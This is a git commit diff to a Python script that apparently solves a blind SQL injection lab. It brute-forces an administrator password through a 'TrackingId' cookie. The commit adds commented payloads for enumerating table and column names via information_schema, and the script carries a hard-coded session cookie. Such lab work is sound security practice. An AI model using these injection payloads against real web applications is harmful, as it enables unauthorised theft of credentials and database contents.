1c0eb960accef05d76cef582581f70cd39b25312
baphx6 <105150731+baphx6@users.noreply.github.com>
2023-06-21 11:15:14 +0000

    ToDo: further enumeration

--- blind_sqli_conditional_response.py
+++ blind_sqli_conditional_response.py
@@ -27,6 +27,9 @@ def bruteForce():
         for char in char_pool:
             custom_cookies = { # injectable field (CHANGE COOKIES)
                     "TrackingId": f"Xa5MpixG2VNuLJtG' and (select substring(password,{index},1) from users where username='administrator' limit 1)='{char}'-- -",
+                    # To "fuzz" the name of the table: ' and (select substring(table_name, {index}, 1) from information_schema.tables limit 1)='{char}'-- -
+                    # Name of the first column of the table "users": ' and (select substring(column_name,{index},1) from information_schema.columns where table_name='users' limit 1)='{char}'-- -
+                    # TODO: Figure how to enumerate all columns and all tables
                     "session": "OWOYC57WEb2u92Fel8aKaAT3TS9MlB65"
                     }
             p1.status(custom_cookies["TrackingId"])
